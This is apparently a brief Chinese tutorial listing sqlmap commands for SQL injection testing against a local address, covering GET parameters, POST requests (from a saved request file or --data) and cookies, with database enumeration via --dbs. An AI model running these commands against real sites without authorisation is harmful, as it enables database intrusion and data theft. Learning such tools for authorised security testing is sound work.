1.get注入

```javascript
sqlmap -u"http://127.0.0.1/index.php?id=1" --dbs
```

sqlmap会自动对id参数进行注入测试。



2.post注入

```javascript
sqlmap -r"bp.txt"
```

使用当前目录下的bp.txt进行sql注入测试。



post注入也可以，使用--data参数

```javascript
sqlmap -u"http://127.0.0.1/index.php" --data="username=admin"
```



3.cookie注入

```javascript
sqlmap -u"http://127.0.0.1/index.php?id=1" --cookie="id=1" --dbs
```

对该地址的cookie注入测试。
